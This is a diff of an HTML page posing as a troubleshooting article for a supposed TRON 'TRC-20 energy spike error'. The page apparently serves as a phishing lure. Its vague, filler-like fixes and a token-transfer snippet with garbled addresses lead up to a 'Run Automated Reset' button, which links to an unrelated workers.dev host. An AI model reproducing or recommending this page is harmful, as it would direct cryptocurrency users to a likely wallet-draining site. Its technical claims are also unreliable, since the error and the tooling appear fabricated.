@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Critical Trc 20 Energy Spike Error</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
+        font-family: system-ui;
         background: #0a0c10;
         color: #ddd;
         padding: 20px;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -41,31 +41,31 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Critical TRC-20 energy spike error" when attempting to execute a smart contract or perform a transaction on the TRON network, resulting in failed transactions and potential financial losses.</li>
+<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an unusual surge in energy consumption for TRC-20 transactions on the TRON network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to an unexpected surge in energy consumption by a smart contract, exceeding the allocated energy limits set by the TRON network, thereby causing the contract execution to fail.</li>
+<li>This error occurs when the energy requirements for a TRC-20 transaction exceed the allocated limit, often due to a sudden increase in network activity or an issue with the smart contract.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the energy limit for the smart contract to accommodate the unexpected surge in energy consumption.</li>
-<li>Optimize the smart contract code to reduce energy consumption and prevent future spikes.</li>
-<li>Temporarily pause the contract execution to investigate and resolve the underlying issue, as shown in the following code block:</li>
+<li>Adjust the transaction energy limit: <code>trontx</code> commands can be used to modify the energy limit for individual transactions.</li>
+<li>Optimize smart contract code: Review and refactor the smart contract to reduce energy consumption.</li>
+<li>Implement energy-efficient transaction batching: </li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;contract_address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TLxxxxxxxxxxxxxxxx&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;function&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;pauseContract&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;parameters&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.sendToken<span class="o">(</span>
+<span class="w">  </span><span class="s2">&quot;TLSjz7xjXqj55NhJQVxVQj5uQj5uQj5uQ&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;TLjz7xjXqj5jXqj5NhJQVxVQj5uQj5u&quot;</span>,
+<span class="w">  </span><span class="m">1000000</span>
+<span class="o">)</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced debugging and monitoring capabilities. </p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration options. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Familiarity with TRON network architecture and smart contract development</li>
-<li>Access to the TRON Web3 console or a compatible interface</li>
-<li>Basic understanding of energy management on the TRON network</li>
+<li>TRON wallet software installed and configured</li>
+<li>Basic understanding of TRON network and TRC-20 transactions</li>
+<li>Familiarity with <code>tronweb</code> and <code>trontx</code> command-line tools</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
